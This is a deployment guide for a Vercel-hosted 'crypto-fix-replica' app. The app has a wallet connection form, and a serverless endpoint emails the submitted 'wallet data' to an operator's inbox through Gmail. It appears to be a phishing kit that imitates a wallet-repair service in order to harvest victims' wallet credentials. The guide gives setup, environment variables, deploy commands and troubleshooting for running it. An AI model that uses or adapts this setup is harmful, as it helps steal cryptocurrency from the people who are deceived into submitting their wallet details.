# Vercel Deployment Guide

This guide will help you deploy your fullstack crypto app to Vercel using serverless functions.

## Prerequisites

1. Vercel account (https://vercel.com)
2. Vercel CLI installed: `npm i -g vercel`
3. Gmail account for email notifications
4. App password generated for Gmail (not your regular password)

## Setup Steps

### 1. Email Configuration

1. **Enable 2-Factor Authentication** on your Gmail account
2. **Generate App Password**:
   - Go to Google Account settings
   - Security → 2-Step Verification
   - App passwords → Generate new app password
   - Save this password (you'll need it for environment variables)

### 2. Vercel Setup

1. **Connect to Vercel**:
   ```bash
   cd crypto-fix-replica-project
   vercel login
   vercel --prod
   ```

2. **Configure Environment Variables** in Vercel Dashboard:
   - Go to your project settings on vercel.com
   - Navigate to Environment Variables
   - Add the following variables:

   ```
   EMAIL_USER=your-email@gmail.com
   EMAIL_PASS=your-gmail-app-password
   RECIPIENT_EMAIL=where-to-receive-notifications@example.com
   ALLOWED_ORIGINS=https://your-vercel-domain.vercel.app
   NODE_ENV=production
   ```

### 3. Deployment

1. **Deploy to Vercel**:
   ```bash
   vercel --prod
   ```

2. **Test the deployment**:
   - Visit your Vercel URL
   - Test the wallet connection form
   - Check that emails are being sent

## Project Structure for Vercel

```
crypto-fix-replica-project/
├── api/                          # Vercel serverless functions
│   ├── connect-wallet.js         # Main wallet connection API
│   └── health.js                 # Health check endpoint
├── src/                          # React frontend
├── public/                       # Static assets
├── vercel.json                   # Vercel configuration
├── package.json                  # Dependencies and scripts
└── .env.example                  # Environment variables template
```

## API Endpoints

- `POST /api/connect-wallet` - Submit wallet connection data
- `GET /api/health` - Health check endpoint

## Features

✅ **Serverless Backend**: Express server converted to Vercel functions  
✅ **Email Notifications**: Nodemailer integration for wallet data  
✅ **Rate Limiting**: Built-in protection against spam  
✅ **CORS Configuration**: Proper cross-origin setup  
✅ **Error Handling**: Comprehensive error management  
✅ **Security**: IP tracking and request validation  

## Monitoring

- Check Vercel function logs in the dashboard
- Monitor email delivery
- Review error logs for debugging

## Development vs Production

- **Development**: Use `npm run dev` for local development
- **Production**: Vercel handles building and serving automatically

## Troubleshooting

### Common Issues:

1. **Email not sending**:
   - Verify Gmail app password is correct
   - Check environment variables are set in Vercel
   - Review function logs for errors

2. **CORS errors**:
   - Update `ALLOWED_ORIGINS` environment variable
   - Ensure your domain is included

3. **Function timeout**:
   - Vercel functions have a 10-second timeout limit
   - Check for long-running operations

### Debug Commands:

```bash
# Check function logs
vercel logs

# Test locally
vercel dev

# Redeploy
vercel --prod --force
```

## Security Considerations

- Never commit `.env` files with real credentials
- Use environment variables for all sensitive data
- Monitor function usage and costs
- Implement additional rate limiting if needed

## Cost Optimization

- Vercel offers generous free tier limits
- Monitor function invocations
- Consider upgrading for higher usage

---

**Note**: This deployment configuration replaces the traditional Express server with Vercel serverless functions, providing better scalability and automatic SSL certificates.
